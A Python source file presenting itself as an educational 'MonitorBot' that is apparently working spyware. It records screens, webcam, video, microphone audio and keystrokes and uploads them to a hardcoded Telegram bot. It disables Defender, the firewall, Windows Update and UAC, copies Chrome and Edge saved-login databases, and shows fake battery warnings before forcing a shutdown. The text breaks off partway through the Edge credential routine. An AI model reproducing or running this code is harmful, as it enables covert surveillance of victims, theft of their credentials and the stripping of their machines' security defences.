"""
🎯 Advanced MonitorBot - Complete System Control
🚀 Version: 3.1 | Full Featured | All Bugs Fixed
📅 Created with ❤️ for Educational Purposes
"""

# ==================== AUTO DEPENDENCIES INSTALLER ====================
import subprocess
import sys
import os
import tempfile

def setup_environment():
    """Setup Python environment and install required packages"""
    print("🔧 Setting up MonitorBot environment...")
    
    required_packages = [
        "requests", "mss", "opencv-python", "numpy", 
        "sounddevice", "scipy", "psutil", "pynput", 
        "cryptography", "pillow"
    ]
    
    for package in required_packages:
        try:
            if package == "opencv-python":
                __import__("cv2")
            elif package == "pynput":
                __import__("pynput.keyboard")
            elif package == "cryptography":
                __import__("cryptography.hazmat")
            else:
                __import__(package)
            print(f"   ✅ {package}")
        except ImportError:
            print(f"   📦 Installing {package}...")
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", package],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print(f"   ✅ {package} installed")
            except Exception as e:
                print(f"   ❌ Failed to install {package}: {e}")

setup_environment()

# ==================== IMPORTS ====================
import ctypes
import time
import socket
import platform
import getpass
import threading
from datetime import datetime
import logging
import requests
import mss
import mss.tools
import cv2
import numpy as np
import sounddevice as sd
from scipy.io.wavfile import write
import psutil
import tkinter as tk
from threading import Thread
import re
import sqlite3
import shutil
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from pynput import keyboard

try:
    import winsound
except ImportError:
    winsound = None

# ==================== CONFIGURATION ====================
class Config:
    """Configuration settings for MonitorBot"""
    # Paths
    CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
    TEMP_DIR = os.getenv("TEMP", r"C:\Windows\Temp")
    QUEUE_DIR = os.path.join(TEMP_DIR, "MonitorQueue")
    LOG_DIR = os.path.join(CURRENT_DIR, "logs")
    
    # Telegram
    TOKEN = "8375011972:AAF5NvgWpB_ERP1hqjmcrUpoMz3q8pd5JO4"
    CHAT_ID = "5846327099"
    
    # Capture settings
    AUDIO_DURATION = 30
    AUDIO_FS = 44100
    UPLOAD_TIMEOUT = 60
    WEBCAM_WARMUP = 1.0
    
    # System settings
    LOOP_DELAY = 30
    DEBUG_MODE = True
    
    def __init__(self):
        self.create_directories()
    
    def create_directories(self):
        """Create necessary directories"""
        os.makedirs(self.QUEUE_DIR, exist_ok=True)
        os.makedirs(self.LOG_DIR, exist_ok=True)

# Initialize config
config = Config()

# ==================== GLOBAL VARIABLES ====================
loop_running = False
loop_thread = None
monitor_active = True
offset = None
keylogger = None
audio_streamer = None

# Thread locks for safety
loop_lock = threading.Lock()
monitor_lock = threading.Lock()

# ==================== LOGGING SYSTEM ====================
class AdvancedLogger:
    """Advanced logging system"""
    
    def __init__(self):
        self.setup_logging()
    
    def setup_logging(self):
        """Setup logging configuration"""
        log_file = os.path.join(config.LOG_DIR, "monitorbot.log")
        
        logging.basicConfig(
            level=logging.DEBUG if config.DEBUG_MODE else logging.INFO,
            format='[%(asctime)s] %(levelname)-8s - %(message)s',
            datefmt='%Y-%m-%d %I:%M:%S %p',
            handlers=[
                logging.FileHandler(log_file, encoding='utf-8'),
                logging.StreamHandler()
            ]
        )
        
        self.logger = logging.getLogger()
        self.logger.info("🚀 Advanced MonitorBot Started")
    
    def log_info(self, message):
        """Info level logging"""
        self.logger.info(message)
    
    def log_error(self, message):
        """Error level logging"""
        self.logger.error(message)
    
    def log_debug(self, message):
        """Debug level logging"""
        if config.DEBUG_MODE:
            self.logger.debug(message)

# Initialize logger
logger = AdvancedLogger()

# ==================== UTILITY FUNCTIONS ====================
class SystemUtils:
    """System utility functions"""
    
    @staticmethod
    def timestamp_now():
        """Get current timestamp"""
        return datetime.now().strftime("%I:%M:%S %p — %Y-%m-%d")
    
    @staticmethod
    def network_available():
        """Check network connectivity"""
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=5)
            return True
        except Exception:
            return False
    
    @staticmethod
    def is_admin():
        """Check if running as administrator"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except Exception:
            return False
    
    @staticmethod
    def run_as_admin():
        """Run as administrator"""
        try:
            if not SystemUtils.is_admin():
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, 1
                )
                sys.exit()
            return True
        except Exception as e:
            logger.log_error(f"Admin elevation failed: {e}")
            return False

# ==================== TELEGRAM BOT ====================
class TelegramBot:
    """Advanced Telegram Bot with enhanced features"""
    
    def __init__(self, token=config.TOKEN, chat_id=config.CHAT_ID):
        self.token = token
        self.chat_id = chat_id
        self.session = requests.Session()
        self.session.timeout = config.UPLOAD_TIMEOUT
    
    def _api_request(self, method, data=None, files=None):
        """Make Telegram API request"""
        url = f"https://api.telegram.org/bot{self.token}/{method}"
        
        try:
            if files:
                response = self.session.post(url, data=data, files=files, timeout=config.UPLOAD_TIMEOUT)
            else:
                response = self.session.post(url, data=data, timeout=config.UPLOAD_TIMEOUT)
            
            logger.log_debug(f"Telegram API: {method} - Status: {response.status_code}")
            return response
            
        except Exception as e:
            logger.log_error(f"Telegram API error ({method}): {e}")
            return None
    
    def send_message(self, text):
        """Send message to Telegram"""
        max_retries = 3
        
        for attempt in range(max_retries):
            try:
                data = {
                    "chat_id": self.chat_id,
                    "text": text,
                    "parse_mode": "Markdown"
                }
                
                response = self._api_request("sendMessage", data=data)
                
                if response and response.status_code == 200:
                    return True
                else:
                    logger.log_error(f"Send message failed (attempt {attempt + 1})")
                    time.sleep(2)
                    
            except Exception as e:
                logger.log_error(f"Send message error (attempt {attempt + 1}): {e}")
                time.sleep(2)
        
        return False
    
    def send_file(self, file_path, file_type="document", caption=None):
        """Send file to Telegram"""
        if not os.path.exists(file_path):
            logger.log_error(f"File not found: {file_path}")
            return False
        
        try:
            # Map file types to methods
            method_map = {
                "photo": "sendPhoto",
                "audio": "sendAudio",
                "document": "sendDocument",
                "video": "sendVideo"
            }
            
            method = method_map.get(file_type, "sendDocument")
            
            with open(file_path, "rb") as file:
                files = {file_type: file}
                data = {"chat_id": self.chat_id}
                
                if caption:
                    data["caption"] = caption
                
                response = self._api_request(method, data=data, files=files)
                
                if response and response.status_code == 200:
                    logger.log_info(f"File sent: {file_path}")
                    return True
                else:
                    logger.log_error(f"File send failed: {file_path}")
                    return False
                    
        except Exception as e:
            logger.log_error(f"Send file error: {e}")
            return False
    
    def send_location(self, lat, lon):
        """Send location to Telegram"""
        data = {
            "chat_id": self.chat_id,
            "latitude": lat,
            "longitude": lon
        }
        
        response = self._api_request("sendLocation", data=data)
        return bool(response and response.status_code == 200)

# ==================== CAPTURE SYSTEM ====================
class CaptureManager:
    """Advanced capture management system"""
    
    def __init__(self, queue_dir=config.QUEUE_DIR):
        self.queue_dir = queue_dir
        os.makedirs(queue_dir, exist_ok=True)
    
    def capture_desktop(self):
        """Capture desktop screenshot"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = os.path.join(self.queue_dir, f"desktop_{timestamp}.png")
            
            with mss.mss() as sct:
                # Capture primary monitor
                monitor = sct.monitors[1]
                screenshot = sct.grab(monitor)
                mss.tools.to_png(screenshot.rgb, screenshot.size, output=path)
            
            self._add_timestamp(path)
            logger.log_info(f"Desktop captured: {path}")
            return path
            
        except Exception as e:
            logger.log_error(f"Desktop capture failed: {e}")
            return None
    
    def capture_webcam(self):
        """Capture webcam image"""
        camera = None
        max_attempts = 3
        
        for attempt in range(max_attempts):
            try:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                path = os.path.join(self.queue_dir, f"webcam_{timestamp}.jpg")
                
                # Improved webcam initialization
                camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                camera.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                camera.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
                camera.set(cv2.CAP_PROP_FPS, 30)
                
                if not camera.isOpened():
                    logger.log_error(f"Webcam not available (attempt {attempt + 1})")
                    time.sleep(1)
                    continue
                
                # Camera warmup with timeout
                start_time = time.time()
                while time.time() - start_time < config.WEBCAM_WARMUP:
                    ret, frame = camera.read()
                    if not ret:
                        break
                    time.sleep(0.1)
                
                success, frame = camera.read()
                
                if success and frame is not None:
                    cv2.imwrite(path, frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
                    self._add_timestamp(path)
                    logger.log_info(f"Webcam captured: {path}")
                    return path
                else:
                    logger.log_error(f"Webcam frame capture failed (attempt {attempt + 1})")
                    
            except Exception as e:
                logger.log_error(f"Webcam capture attempt {attempt + 1} failed: {e}")
                
            finally:
                # ✅ FIXED: Always release camera
                if camera:
                    camera.release()
                    time.sleep(0.5)  # Give time for release
        
        logger.log_error("All webcam capture attempts failed")
        return None
    
    def record_audio(self, duration=config.AUDIO_DURATION):
        """Record audio from microphone"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = os.path.join(self.queue_dir, f"audio_{timestamp}.wav")
            
            frames = int(duration * config.AUDIO_FS)
            
            # ✅ FIXED: Better audio recording with error handling
            recording = sd.rec(
                frames, 
                samplerate=config.AUDIO_FS, 
                channels=1, 
                dtype='float32',
                blocking=True
            )
            sd.wait()  # Wait for recording to complete
            
            if recording is None or recording.size == 0:
                logger.log_error("Audio recording empty")
                return None
            
            # Normalize audio safely
            if np.any(recording):
                max_val = np.max(np.abs(recording))
                if max_val > 0:
                    recording = recording / max_val
                else:
                    recording = np.zeros_like(recording)
                
                write(path, config.AUDIO_FS, (recording * 32767).astype(np.int16))
                logger.log_info(f"Audio recorded: {path}")
                return path
            else:
                logger.log_error("Audio recording contains no data")
                return None
                
        except Exception as e:
            logger.log_error(f"Audio recording failed: {e}")
            return None
    
    def record_video(self, duration=30):
        """Record video from webcam"""
        camera = None
        video_writer = None
        
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = os.path.join(self.queue_dir, f"video_{timestamp}.avi")
            
            camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
            
            if not camera.isOpened():
                logger.log_error("Cannot open webcam for video")
                return None
            
            # Get camera properties
            frame_width = int(camera.get(cv2.CAP_PROP_FRAME_WIDTH))
            frame_height = int(camera.get(cv2.CAP_PROP_FRAME_HEIGHT))
            fps = 20.0
            
            # Setup video writer
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            video_writer = cv2.VideoWriter(path, fourcc, fps, (frame_width, frame_height))
            
            start_time = time.time()
            
            while (time.time() - start_time) < duration:
                success, frame = camera.read()
                if success:
                    # Add timestamp to video frame
                    cv2.putText(
                        frame, SystemUtils.timestamp_now(), (10, 30),
                        cv2.FONT_HERSHEY_SIMPLEX, 0.6, (0, 255, 255), 2
                    )
                    video_writer.write(frame)
                else:
                    break
            
            logger.log_info(f"Video recorded: {path}")
            return path
            
        except Exception as e:
            logger.log_error(f"Video recording failed: {e}")
            return None
            
        finally:
            if camera:
                camera.release()
            if video_writer:
                video_writer.release()
    
    def _add_timestamp(self, image_path):
        """Add timestamp to image"""
        try:
            image = cv2.imread(image_path)
            if image is None:
                return
            
            timestamp = SystemUtils.timestamp_now()
            font = cv2.FONT_HERSHEY_SIMPLEX
            
            # Add background for text
            text_size = cv2.getTextSize(timestamp, font, 0.6, 2)[0]
            cv2.rectangle(
                image, (5, image.shape[0] - text_size[1] - 10),
                (text_size[0] + 15, image.shape[0] - 5), (0, 0, 0), -1
            )
            
            # Add timestamp text
            cv2.putText(
                image, timestamp, (10, image.shape[0] - 10),
                font, 0.6, (0, 255, 255), 2, cv2.LINE_AA
            )
            
            cv2.imwrite(image_path, image)
            
        except Exception as e:
            logger.log_error(f"Timestamp add failed: {e}")

# ==================== KEYLOGGER SYSTEM ====================
class KeyLogger:
    """Advanced keylogging system"""
    
    def __init__(self, bot):
        self.bot = bot
        self.log = ""
        self.last_sent = time.time()
        self.is_running = False
        self.listener = None
    
    def on_press(self, key):
        """Key press event handler"""
        try:
            if not self.is_running:
                return False
            
            # Handle different key types
            if hasattr(key, 'char') and key.char:
                self.log += key.char
            else:
                # Special keys mapping
                key_map = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n[ENTER]\n',
                    keyboard.Key.tab: '[TAB]',
                    keyboard.Key.backspace: '[BACKSPACE]',
                    keyboard.Key.esc: '[ESC]',
                    keyboard.Key.shift: '[SHIFT]',
                    keyboard.Key.ctrl: '[CTRL]',
                    keyboard.Key.alt: '[ALT]'
                }
                self.log += key_map.get(key, f'[{key.name.upper()}]')
            
            # Auto-send conditions
            if len(self.log) >= 500 or (time.time() - self.last_sent) > 120:
                self.send_log()
                
        except Exception as e:
            logger.log_error(f"Keylogger error: {e}")
    
    def send_log(self):
        """Send keylog data"""
        if len(self.log.strip()) < 10:
            return
        
        try:
            timestamp = int(time.time())
            log_file = os.path.join(config.QUEUE_DIR, f"keylog_{timestamp}.txt")
            
            with open(log_file, 'w', encoding='utf-8') as file:
                file.write(f"🔑 Keylogger Data - {SystemUtils.timestamp_now()}\n")
                file.write("=" * 50 + "\n")
                file.write(self.log + "\n")
                file.write("=" * 50 + "\n")
                file.write(f"Total Characters: {len(self.log)}\n")
            
            # Send via Telegram
            if self.bot.send_file(log_file, "document", "⌨️ Keylogger Data"):
                self.log = ""
                self.last_sent = time.time()
            
            # Cleanup
            try:
                os.remove(log_file)
            except Exception:
                pass
                
        except Exception as e:
            logger.log_error(f"Keylog send failed: {e}")
    
    def start(self):
        """Start keylogger"""
        if self.is_running:
            return True
        
        try:
            self.is_running = True
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.daemon = True
            self.listener.start()
            logger.log_info("Keylogger started successfully")
            return True
        except Exception as e:
            logger.log_error(f"Keylogger start failed: {e}")
            return False
    
    def stop(self):
        """Stop keylogger"""
        self.is_running = False
        if self.listener:
            self.listener.stop()
        self.send_log()  # Send final log
        logger.log_info("Keylogger stopped")

# ==================== SECURITY CONTROL SYSTEM ====================
class SecurityController:
    """Windows security controls management"""
    
    @staticmethod
    def windows_update_control(enable=True):
        """Control Windows Update service"""
        try:
            if enable:
                commands = [
                    "sc config wuauserv start= auto",
                    "net start wuauserv",
                    'powershell -Command "Set-Service -Name wuauserv -StartupType Automatic"',
                    'powershell -Command "Start-Service -Name wuauserv"'
                ]
                action = "enabled"
            else:
                commands = [
                    "net stop wuauserv",
                    "sc config wuauserv start= disabled",
                    'powershell -Command "Stop-Service -Name wuauserv"',
                    'powershell -Command "Set-Service -Name wuauserv -StartupType Disabled"'
                ]
                action = "disabled"
            
            return SecurityController._execute_commands(commands, f"Windows Update {action}")
            
        except Exception as e:
            logger.log_error(f"Windows update control failed: {e}")
            return False, str(e)
    
    @staticmethod
    def windows_firewall_control(enable=True):
        """Control Windows Firewall"""
        try:
            if enable:
                commands = [
                    "netsh advfirewall set allprofiles state on",
                    'powershell -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True"'
                ]
                action = "enabled"
            else:
                commands = [
                    "netsh advfirewall set allprofiles state off",
                    'powershell -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"'
                ]
                action = "disabled"
            
            return SecurityController._execute_commands(commands, f"Windows Firewall {action}")
            
        except Exception as e:
            logger.log_error(f"Windows firewall control failed: {e}")
            return False, str(e)
    

    @staticmethod
    def defender_realtime_control(enable=True):
        """Control Windows Defender Realtime Protection using Group Policy"""
        try:
            if not SystemUtils.is_admin():
                return False, "Administrator privileges required"
            
            if enable:
                commands = [
                    'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"',
                    'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $false"',
                    'powershell -Command "Set-MpPreference -DisableIOAVProtection $false"',
                    'powershell -Command "Set-MpPreference -DisableScriptScanning $false"',
                    # Remove Group Policy restrictions
                    'reg delete "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /f',
                    'reg delete "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /f /reg:64',
                    'gpupdate /force',
                    'net stop WinDefend',
                    'net start WinDefend'
                ]
                action = "enabled"
            else:
                commands = [
                    # Group Policy Registry Keys - This will force disable via Group Policy
                    'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
                    'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f',
                    'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f',
                    'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f',
                    'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f',
                    'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f',
                    # Force Group Policy update
                    'gpupdate /force',
                    # Stop Defender services
                    'net stop WinDefend',
                    'sc config WinDefend start= disabled',
                    'net stop WdNisSvc',
                    'sc config WdNisSvc start= disabled',
                    'net stop Sense',
                    'sc config Sense start= disabled'
                ]
                action = "disabled"
            
            success, details = SecurityController._execute_commands(commands, f"Defender Realtime {action}")
            
            if success:
                # Additional verification
                if not enable:
                    time.sleep(2)
                    # Double check if disabled
                    verify_cmd = 'powershell -Command "Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled"'
                    result = subprocess.run(verify_cmd, shell=True, capture_output=True, text=True)
                    if "False" in result.stdout:
                        details += "\n\n✅ Verification: Real-time Protection Successfully Disabled via Group Policy"
                    else:
                        details += "\n\n⚠️ Warning: May require reboot to fully apply Group Policy"
            
            return success, details
            
        except Exception as e:
            logger.log_error(f"Defender control failed: {e}")
            return False, str(e)
    
    @staticmethod
    def uac_control(enable=True):
        """Control User Account Control (UAC)"""
        try:
            if not SystemUtils.is_admin():
                return False, "Administrator privileges required for UAC control"
            
            if enable:
                commands = [
                    'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 1 /f',
                    'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 2 /f',
                    'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v PromptOnSecureDesktop /t REG_DWORD /d 1 /f'
                ]
                action = "enabled"
                description = "UAC Enabled (Always notify)"
            else:
                commands = [
                    'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 1 /f',
                    'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f',
                    'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f'
                ]
                action = "disabled"
                description = "UAC Disabled (No notifications)"
            
            success, details = SecurityController._execute_commands(commands, f"UAC {action}")
            
            if success:
                return True, f"{description}\n\n{details}"
            else:
                return False, f"UAC control failed\n\n{details}"
                
        except Exception as e:
            logger.log_error(f"UAC control failed: {e}")
            return False, f"UAC control error: {str(e)}"
    
    @staticmethod
    def get_security_status():
        """Get comprehensive security status"""
        status_info = ["🛡️ *Windows Security Status*", "=" * 35]
        
        try:
            # Windows Update status
            try:
                result = subprocess.run(
                    "sc query wuauserv", shell=True, 
                    capture_output=True, text=True, timeout=15
                )
                if "RUNNING" in result.stdout:
                    status_info.append("🟢 Windows Update: Running")
                else:
                    status_info.append("🔴 Windows Update: Stopped")
            except:
                status_info.append("❓ Windows Update: Unknown")
            
            # Firewall status
            try:
                result = subprocess.run(
                    "netsh advfirewall show allprofiles state", shell=True,
                    capture_output=True, text=True, timeout=15
                )
                if "ON" in result.stdout:
                    status_info.append("🟢 Windows Firewall: Enabled")
                else:
                    status_info.append("🔴 Windows Firewall: Disabled")
            except:
                status_info.append("❓ Windows Firewall: Unknown")
            
            # Defender status
            try:
                result = subprocess.run(
                    'powershell -Command "Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled"',
                    shell=True, capture_output=True, text=True, timeout=15
                )
                if "True" in result.stdout:
                    status_info.append("🟢 Defender Realtime: Enabled")
                else:
                    status_info.append("🔴 Defender Realtime: Disabled")
            except:
                status_info.append("❓ Defender Realtime: Unknown")
            
            # UAC status
            try:
                result = subprocess.run(
                    'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ConsentPromptBehaviorAdmin',
                    shell=True, capture_output=True, text=True, timeout=15
                )
                if "0x0" in result.stdout:
                    status_info.append("🔴 UAC: Disabled")
                else:
                    status_info.append("🟢 UAC: Enabled")
            except:
                status_info.append("❓ UAC: Unknown")
            
            return "\n".join(status_info)
            
        except Exception as e:
            return f"Error getting security status: {str(e)}"
    
    @staticmethod
    def _execute_commands(commands, description):
        """Execute multiple commands and return results"""
        success_count = 0
        details = []
        
        for command in commands:
            try:
                result = subprocess.run(
                    command, shell=True, 
                    capture_output=True, text=True, timeout=30
                )
                
                if result.returncode == 0:
                    success_count += 1
                    details.append(f"✅ {command}")
                else:
                    error_msg = result.stderr.strip() if result.stderr else "Unknown error"
                    details.append(f"❌ {command} - Error: {error_msg}")
                    
            except Exception as e:
                details.append(f"❌ {command} - Exception: {str(e)}")
        
        logger.log_info(f"{description}: {success_count}/{len(commands)} successful")
        
        if success_count >= len(commands) // 2:
            return True, "\n".join(details)
        else:
            return False, "\n".join(details)

# ==================== LOCATION SERVICES ====================
class LocationService:
    """Location and system information services"""
    
    @staticmethod
    def get_geo_info():
        """Get geographical information"""
        try:
            response = requests.get("https://ipinfo.io/json", timeout=10)
            if response.status_code == 200:
                data = response.json()
                location = data.get('loc', '').split(',')
                
                return {
                    'ip': data.get('ip', 'N/A'),
                    'city': data.get('city', 'N/A'),
                    'region': data.get('region', 'N/A'),
                    'country': data.get('country', 'N/A'),
                    'latitude': float(location[0]) if len(location) == 2 else None,
                    'longitude': float(location[1]) if len(location) == 2 else None
                }
        except Exception as e:
            logger.log_error(f"Geo info failed: {e}")
        
        return {
            'ip': 'N/A', 'city': 'N/A', 'region': 'N/A', 
            'country': 'N/A', 'latitude': None, 'longitude': None
        }
    
    @staticmethod
    def get_system_info():
        """Get comprehensive system information"""
        try:
            hostname = platform.node()
            username = getpass.getuser()
            os_info = f"{platform.system()} {platform.release()}"
            
            # CPU and RAM usage
            cpu_usage = psutil.cpu_percent()
            ram_usage = psutil.virtual_memory().percent
            ram_total = round(psutil.virtual_memory().total / (1024 ** 3), 2)
            
            # Battery info
            battery = psutil.sensors_battery()
            if battery:
                battery_status = f"{battery.percent}% ({'Charging' if battery.power_plugged else 'Battery'})"
            else:
                battery_status = "N/A"
            
            # Disk usage
            disk_usage = psutil.disk_usage('/')
            disk_total = round(disk_usage.total / (1024 ** 3), 2)
            disk_used = round(disk_usage.used / (1024 ** 3), 2)
            
            return {
                'hostname': hostname,
                'username': username,
                'os': os_info,
                'cpu_usage': cpu_usage,
                'ram_usage': ram_usage,
                'ram_total': ram_total,
                'battery': battery_status,
                'disk_total': disk_total,
                'disk_used': disk_used,
                'network': "Connected" if SystemUtils.network_available() else "Disconnected"
            }
            
        except Exception as e:
            logger.log_error(f"System info failed: {e}")
            return {}
    
    @staticmethod
    def build_location_message():
        """Build comprehensive location and system message"""
        geo_info = LocationService.get_geo_info()
        system_info = LocationService.get_system_info()
        
        coordinates = f"{geo_info['latitude']}, {geo_info['longitude']}" \
                    if geo_info['latitude'] and geo_info['longitude'] else "N/A"
        
        message = f"""📍 *System & Location Information*

💻 *System Overview*
• Hostname: `{system_info.get('hostname', 'N/A')}`
• Username: `{system_info.get('username', 'N/A')}`
• OS: `{system_info.get('os', 'N/A')}`
• CPU Usage: `{system_info.get('cpu_usage', 'N/A')}%`
• RAM Usage: `{system_info.get('ram_usage', 'N/A')}%` ({system_info.get('ram_total', 'N/A')} GB)
• Battery: `{system_info.get('battery', 'N/A')}`
• Disk: `{system_info.get('disk_used', 'N/A')}/{system_info.get('disk_total', 'N/A')} GB`
• Network: `{system_info.get('network', 'N/A')}`

🌍 *Geographical Information*
• IP Address: `{geo_info['ip']}`
• City: `{geo_info['city']}`
• Region: `{geo_info['region']}`
• Country: `{geo_info['country']}`
• Coordinates: `{coordinates}`

🕒 *Current Time*: {SystemUtils.timestamp_now()}
"""
        return message, geo_info

# ==================== SPECIAL EFFECTS ====================
class SpecialEffects:
    """Special visual and audio effects"""
    
    @staticmethod
    def show_note_popup(message, duration=5):
        """Show popup note on screen"""
        def show_popup():
            try:
                root = tk.Tk()
                root.withdraw()
                
                # Create popup window
                popup = tk.Toplevel(root)
                popup.overrideredirect(True)
                popup.attributes("-topmost", True)
                popup.attributes("-alpha", 0.9)
                
                # Center window
                screen_width = popup.winfo_screenwidth()
                screen_height = popup.winfo_screenheight()
                window_width = 600
                window_height = 150
                
                x = (screen_width - window_width) // 2
                y = (screen_height - window_height) // 2
                
                popup.geometry(f"{window_width}x{window_height}+{x}+{y}")
                popup.configure(bg='#1a1a1a')
                
                # Message label
                label = tk.Label(
                    popup, text=message, font=("Arial", 16, "bold"),
                    fg="#00ff00", bg="#1a1a1a", wraplength=550, 
                    justify="center"
                )
                label.pack(expand=True, fill="both", padx=20, pady=20)
                
                # Auto close
                popup.after(int(duration * 1000), popup.destroy)
                popup.mainloop()
                
            except Exception as e:
                logger.log_error(f"Popup note error: {e}")
        
        thread = Thread(target=show_popup, daemon=True)
        thread.start()
    
    @staticmethod
    def fake_battery_overlay(percent=10, duration=8):
        """Show fake low battery overlay"""
        def show_overlay():
            try:
                root = tk.Tk()
                root.attributes('-fullscreen', True)
                root.attributes('-topmost', True)
                root.configure(bg='black')
                root.attributes('-alpha', 0.7)
                
                # Warning message
                label = tk.Label(
                    root, 
                    text=f"⚠️ CRITICALLY LOW BATTERY - {percent}% REMAINING\n\nConnect to power immediately!",
                    font=("Arial", 24, "bold"), 
                    fg="red", bg="black", justify="center"
                )
                label.pack(expand=True)
                
                # Warning sound
                if winsound:
                    winsound.Beep(1000, 500)
                
                # Auto close
                root.after(int(duration * 1000), root.destroy)
                root.mainloop()
                
            except Exception as e:
                logger.log_error(f"Battery overlay error: {e}")
        
        Thread(target=show_overlay, daemon=True).start()
    
    @staticmethod
    def fake_battery_shutdown():
        """Simulate battery drop and shutdown"""
        def simulate_shutdown():
            try:
                # Simulate battery drop
                for percent in [50, 30, 15, 5]:
                    SpecialEffects.fake_battery_overlay(percent, 5)
                    time.sleep(10)
                
                # Final warning and shutdown
                SpecialEffects.fake_battery_overlay(1, 3)
                time.sleep(5)
                os.system("shutdown /s /t 5")
                
            except Exception as e:
                logger.log_error(f"Battery shutdown simulation error: {e}")
        
        Thread(target=simulate_shutdown, daemon=True).start()

# ==================== BROWSER PASSWORD RECOVERY ====================
class PasswordRecovery:
    """Browser password recovery system"""
    
    @staticmethod
    def get_browser_passwords():
        """Recover browser passwords"""
        passwords_data = [
            "🔑 *Browser Passwords Recovery Report*",
            "=" * 45
        ]
        
        try:
            # Chrome passwords
            chrome_count = PasswordRecovery._get_chrome_passwords(passwords_data)
            
            # Edge passwords
            edge_count = PasswordRecovery._get_edge_passwords(passwords_data)
            
            # Summary
            if chrome_count == 0 and edge_count == 0:
                passwords_data.append("\n❌ No passwords found in any browser")
            else:
                passwords_data.append(f"\n📊 Summary: Chrome({chrome_count}), Edge({edge_count})")
                
        except Exception as e:
            passwords_data.append(f"\n❌ Critical Error: {str(e)}")
        
        return passwords_data
    
    @staticmethod
    def _get_chrome_passwords(passwords_data):
        """Get Chrome passwords"""
        try:
            chrome_path = os.path.join(
                os.environ['USERPROFILE'],
                'AppData', 'Local', 'Google', 'Chrome',
                'User Data', 'Default', 'Login Data'
            )
            
            if not os.path.exists(chrome_path):
                return 0
            
            temp_db = os.path.join(config.QUEUE_DIR, "temp_chrome.db")
            shutil.copy2(chrome_path, temp_db)
            
            connection = sqlite3.connect(temp_db)
            cursor = connection.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            count = 0
            for url, username, encrypted_password in cursor.fetchall():
                if url and username:
                    passwords_data.append(f"\n🌐 URL: {url}")
                    passwords_data.append(f"👤 Username: {username}")
                    passwords_data.append(f"🔒 Password: [Encrypted - Master Key Required]")
                    passwords_data.append("-" * 40)
                    count += 1
            
            connection.close()
            os.remove(temp_db)
            
            passwords_data.append(f"\n✅ Chrome: Found {count} passwords")
            return count
            
        except Exception as e:
            passwords_data.append(f"\n❌ Chrome Error: {str(e)}")
            return 0
    
    @staticmethod
    def _get_edge_passwords(passwords_data):
        """Get Edge passwords"""
        try:
            edge_path = os.path.join(
                os.environ['USERPROFILE'],
                'AppData', 'Local', 'Microsoft', 'Edge',
                'User Data', 'Default', 'Login Data'
            )
            
            if not os.path.exists(edge_path):
                return 0
            
            temp_db = os.path.join(config.QUEUE_DIR, "temp_edge.db")
            shutil.copy2(edge_path, temp_db)
            
            connection = sqlite3.connect(temp_db)
            cursor = connection.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            count = 0
            for url, username, encrypted_password in cursor.fetchall():
                if url and username:
                    passwords_data.append(f"\n🌐 URL: {url}")
                    passwords_data.append(f"👤 Username: {username}")
